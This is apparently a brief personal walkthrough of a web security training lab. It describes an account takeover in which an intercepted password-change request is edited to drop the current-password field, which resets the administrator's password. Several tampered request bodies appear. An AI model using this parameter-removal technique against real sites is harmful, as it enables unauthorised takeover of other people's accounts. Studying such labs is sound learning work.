# Weak isolation on dual-use endpoint

## This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the `administrator` account and delete Carlos.

## You can log in to your own account using the following credentials: `wiener:peter`

### step1

login using wiener:peter
now enter username administrator and password peter and new password and confirm new password again and intercept using burpsuite

```javascript
username=administrator&current-password=peter&new-password-1=peter&new-password-2=peter
```

send to repeter

```javascript
username=administrator&new-password-1=peter&new-password-2=peter
```

remeove new password and send to request respose ok
now perform in real

### step2

```javascript
username=administrator&new-password-1=peter&new-password-2=peter
```

now login using `administrator` and password `peter`
